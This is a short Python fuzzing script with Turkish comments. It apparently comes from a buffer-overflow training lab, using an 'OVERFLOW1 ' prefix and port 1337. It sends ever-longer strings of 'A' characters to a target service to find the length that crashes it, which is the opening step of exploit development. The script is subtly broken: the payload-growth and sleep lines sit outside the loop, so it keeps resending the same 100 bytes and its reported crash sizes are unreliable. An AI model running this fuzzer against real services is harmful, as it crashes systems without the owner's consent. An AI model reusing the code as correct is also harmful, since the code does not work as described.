import sys
import time
import socket

# Hedef bilgileri
ip = "IP_ADDRESS"  # Hedef IP adresini burada değiştirin
port = 1337            # Hedef port numarasını burada değiştirin
timeout = 5            # Bağlantı zaman aşımı süresi (saniye)
prefix = "OVERFLOW1 "  # Hedef uygulama için uygun prefix'i burada değiştirin

# Başlangıç dizisi
payload_boyutu = 100
string = prefix + "A" * payload_boyutu

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Soket ayarları
            s.settimeout(timeout)
            # Hedefe bağlan
            s.connect((ip, port))
            s.recv(1024)  # Sunucudan gelen başlangıç mesajını al
            
            # Gönderim işlemi
            print(f"{len(string) - len(prefix)} bayt ile fuzzing yapılıyor")  # Sadece A karakterlerinin sayısı
            s.send(bytes(string, "latin-1"))
            s.recv(1024)  # Cevap bekleniyor
            
    except socket.timeout:
        print(f"[!] Bağlantı zaman aşımına uğradı. Fuzzing işlemi {len(string) - len(prefix)} baytta çöktü.")
        sys.exit(0)
        
    except ConnectionRefusedError:
        print(f"[!] Bağlantı reddedildi. Fuzzing işlemi {len(string) - len(prefix)} baytta çöktü.")
        sys.exit(0)
        
    except Exception as e:
        print(f"[!] Bir hata meydana geldi: {e}")
        print(f"Fuzzing işlemi {len(string) - len(prefix)} baytta çöktü.")
        sys.exit(0)
    
# String uzunluğunu artır
payload_boyutu += 100  # Bayt boyutunu artır
string = prefix + "A" * payload_boyutu  # Yeni string oluştur
time.sleep(1)  # Bir sonraki denemeden önce 1 saniye bekle
